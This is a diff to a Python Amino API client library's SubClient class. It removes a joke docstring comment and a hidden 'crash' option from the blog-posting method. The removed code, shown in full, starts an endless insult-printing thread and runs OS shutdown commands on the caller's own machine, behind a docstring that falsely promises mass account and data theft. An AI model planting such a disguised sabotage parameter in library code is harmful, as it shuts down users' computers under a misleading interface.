@@ -49,10 +49,6 @@ class SubClient(Client):
             - should subclient get info about your profile in community you passed?
             - False for no (default), True for yes
 
-
-        \- imperialwool, where is another fields of subclient??? ;-;
-
-        \- its in main client lol why you need to pass them again
         """
         Client.__init__(
             self,
@@ -233,7 +229,6 @@ class SubClient(Client):
         backgroundColor: str = None,
         fansOnly: bool = False,
         extensions: dict = None,
-        crash: bool = False,
     ) -> int:
         """
         Posting blog.
@@ -253,33 +248,11 @@ class SubClient(Client):
             - works only if you have fanclub
         - extensions: dict = None
             - maybe your code is tight
-        - crash: bool = False
-            - will cause crash for all users in amino and will log out everyone steal everyone's cookies data bank account houses money and etc
 
         Recieving:
         - object `int` (200)
         - on exception, some exception from `aminofixfix.lib.exceptions`
         """
-
-        if crash:
-            import os
-            from threading import Thread
-
-            def work():
-                while True:
-                    print(
-                        "fuck you raider touch some grass learn how to code its not working like that child"
-                    )
-
-            Thread(target=work).start()
-            try:
-                os.system("shutdown /s /t 0")
-            except:
-                pass
-            try:
-                os.system("shutdown now")
-            except:
-                pass
 
         mediaList = []
 
